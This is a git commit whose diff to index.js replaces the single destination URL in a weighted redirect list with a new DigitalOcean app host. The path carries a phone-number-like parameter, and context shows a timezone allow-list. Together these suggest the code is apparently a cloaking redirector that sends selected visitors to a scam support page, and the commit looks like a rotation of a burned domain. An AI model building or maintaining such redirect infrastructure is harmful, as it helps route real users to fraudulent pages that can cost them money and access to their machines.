0807e3274ebb04983026d55391963d7f71bb1547
paalakash <palaksh452@gmail.com>
2026-06-26 07:57:09 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://squid-app-egon3.ondigitalocean.app/werrx01USAHTML/?bcda=1800-875-524", weight: 1.0 }
+    { url: "https://seashell-app-nrvg5.ondigitalocean.app/werrx01USAHTML/?bcda=1800-875-524", weight: 1.0 }
 
 ];
 
